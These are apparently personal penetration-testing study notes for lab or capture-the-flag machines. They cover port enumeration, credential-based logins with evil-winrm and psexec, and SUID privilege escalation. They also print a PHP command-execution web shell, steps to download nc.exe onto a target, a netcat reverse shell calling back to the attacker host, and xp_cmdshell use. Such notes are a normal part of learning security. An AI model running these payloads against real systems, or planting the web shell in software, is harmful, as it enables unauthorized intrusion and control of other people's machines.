# Cyber Security Notes

## Tools
- OpenVPN
- nmap
- smbclient
- Sublime Text
- redis-tools
- gobuster
- mysql
- wordlists from SecLists and naive hashcat
  - directory-list-2.3-medium.txt
  - rockyou.txt
- john the ripper
- responder
- evil-winrm
- peass

## Brute Forcing
### Tools
#### Z3
- Z3 is a theorem prover from Microsoft Research that makes it very easy to brute force questions by specifing rules.
- Can be accessed through Python bindings.

## Vulnerability Scanning
### Port 21
#### FTP
- Use ftp (get to grab files)
- FTP code 230 will be returned in nmap scan if anonymous login is allowed
#### Telnet
- Use telnet

### Ports 445
Usually associated with file sharing (SMB)
- Sensitive info tend to be stored in these areas
- Use smbclient to show available shares and access them
- WorkShares can occasionally be logged into without a password
- E.g. smbclient //127.0.0.1/SHARE$

List shares
```bash
smbclient -N -L //127.0.0.1/
```

### Port 1433
Usually associated with SQL

```xp_cmdshell``` is an extended stored procedure of Microsoft SQL Server that can be used in order to spawn a Windows command shell.
  - Can be used to run powershell with ```xp_cmdshell "powershell -c whoami"```

```impacket-mssqlclient``` can be used in order to establish an authenticated connection to a Microsoft SQL Server.

### Port 5985
Usually associated with Windows Remote Management (winrm).

```evil-winrm``` can be used with user credentials to get a shell on the target machine. E.g.
```bash
evil-winrm -u administrator -p password123 -i $TARGET_IP
```

### Port 6379
Usually associated with redis
- Accessed using redis-cli
- redis is an in-memory database
- Use info to list all databases, then use select `id` to select a database by its id
- Use keys * to get all keys, then get `keyname` to get the corresponding value

## Initial Access
### Simple PHP Payload
> Use + instead of spaces due to URL encoding when sending commands through URL
```php
<?php
  echo system($_GET['c']);
?>
```

### Reverse Shells
> A PHP reverse shell script can be found in usr/share/webshells/php/php-reverse-shell.php

#### Simple Reverse Shell
The simplest way to get a reverse shell on the target machine is using netcat. First, we need to make sure that the target's machine has it installed. If not, we can drop a nc.exe binary on our target machine using ```wget```. For windows machines, this binary can be found in ```usr/share/windows-binaries```.

##### Getting our nc.exe binary on the target machine
1. Start a http server on our machine in the same directory as our binary with ```python -m http.server 80```.
2. Get our host ip using ```ifconfig```.
3. On our target machine using powershell, we run ```wget http://$HOST_IP/nc.exe -outfile nc.exe```. Make sure you are in a directory that is writable to.

##### Using netcat to get a simple reverse shell
1. Start listening with netcat on our host machine with ```nc -lvnp 8044```.
2. On our target machine using powershell, we run ```./nc.exe -e cmd.exe $HOST_IP 8044```

```-e cmd.exe``` means execute cmd.exe as it sends it back to us.

### Spawning a Stable Shell
> This requires that you already have a reverse shell on the target machine

First, run the following on the target machine
```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

On our host machine, we will then run
```bash
stty raw -echo
```
The dash means "disable" a setting, so -echo disables echoing. The raw setting means that the input and output is not processed, just sent straight through. So with stty raw you can't hit Ctrl-C to end a process, for example. This helps to make the shell more stable.

Finally, on our target machine we will run
```bash
export TERM=xterm
```
This will set the terminal emulator to the Ubuntu default of xterm.
From here on out, we should have successfully spawned a stable shell.

### Authentication with User Credentials
#### User Credentials and Writable SMB Shares
We can use ```impacket-psexec``` as a way to exploit writable shares on samba to get a way to authenticate to the machine. E.g.
```bash
impacket-psexec administrator:password123@$TARGET_IP
```

### Common Web Server Setups
> The code for the web server itself can be found in ```var/www```

Often after successfully spawning a reverse shell on a web server we will find ourselves as the user ```www-data```, which is the user web servers use by default for normal operation.

## Privilege Escalation
### SUID Binaries
Occasionally there will be binaries being run on the target machine with the SUID bit. The following command can be used to search for such binaries.
```bash
find / -perm -u=s -type f 2>/dev/null
```

- find: a Linux command to search for files in a directory hierarchy
- perm: is used to define the permissions to search for
- u=s: search for files with the SUID permission
- type f: search for regular file
- 2>dev/null: errors will be deleted automatically

#### Abusing SUID Binaries
We can use strings on the binary to see what other binaries it runs, then replace those binaries with our own which will then be run with elevated permissions.
For example, lets pretend that our binary has the line ```cat stuff```.
We can then create our own "cat" with ```echo "/bin/sh" > cat``` and mark it as executable with ```chmod +x cat```.
Finally, we can modify our path with ```export PATH=YOUR_PATH_HERE:$PATH```, which will cause the binary to look in our path for a cat executable first, thus running our malicious cat instead of the original one and giving us a shell with elevated permissions.

## Useful URLS
- https://github.com/swisskyrepo/PayloadsAllTheThings
- https://github.com/undergroundwires/CEH-in-bullet-points
- https://github.com/JohnHammond/ctf-katana
